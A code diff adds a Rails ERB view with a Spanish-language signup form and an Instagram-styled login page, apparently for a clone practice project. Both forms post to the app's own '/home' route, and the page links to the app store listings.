@@ -1,0 +1,65 @@
+
+<%= form_tag "/home" do %>
+
+  <div class="field">
+    <%= email_field_tag :email,  "Correo electronico" %>
+  </div>
+  <div class="field">
+  <%= text_field_tag :nombre, "Nombre completo" %>
+  </div>
+  <div class="field">
+    <%= text_field_tag :usuario, "Nombre de usuario" %>
+  </div>
+  <div class="field">
+    <%= password_field_tag :password %>
+  </div>
+
+  <%= submit_tag "Save", class: " text-sm text-center bg-blue-300 text-white py-1 rounded font-medium" %>
+<% end %>
+
+
+
+
+
+  <div class="h-screen bg-gray-50 flex flex-col mt-40 justify-self-start centrar-div">
+    <div class="flex flex-col justify-center items-center">
+      <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
+        <h1 class="bg-no-repeat instagram-logo"> <%= image_tag("session/instagram.png") %></h1>
+        <%= form_tag "/home" do %>
+          <div class="mt-8 w-64 flex flex-col">
+            <div >
+              <%= email_field_tag :email, nil, placeholder: "Correo electrónico",
+                                class: "text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none" %>
+            </div>
+            <div>
+              <%= password_field_tag :password, nil, placeholder: "Contraseña",
+                                   class: "text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"%>
+            </div>
+            <div class="grid justify-self-center">
+              <%= submit_tag "Iniciar sesión", class: " text-sm text-center bg-blue-300 text-white py-1 rounded font-medium" %>
+            </div>
+          </div>
+        <% end %>
+        <div class="flex justify-evenly space-x-2 w-64 mt-4">
+          <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
+          <span class="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
+          <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
+        </div>
+
+      </div>
+
+      <div class="mt-3 text-center ">
+        <span class="text-xs">Descargar app</span>
+        <div class="flex mt-3 space-x-2">
+          <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo" target="_blank">
+            <div class="bg-no-repeat apple-store-logo"> <%= image_tag("session/app.png") %></div>
+          </a>
+          <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+            <div class="bg-no-repeat google-store-logo"><%= image_tag("session/google.png") %></div>
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
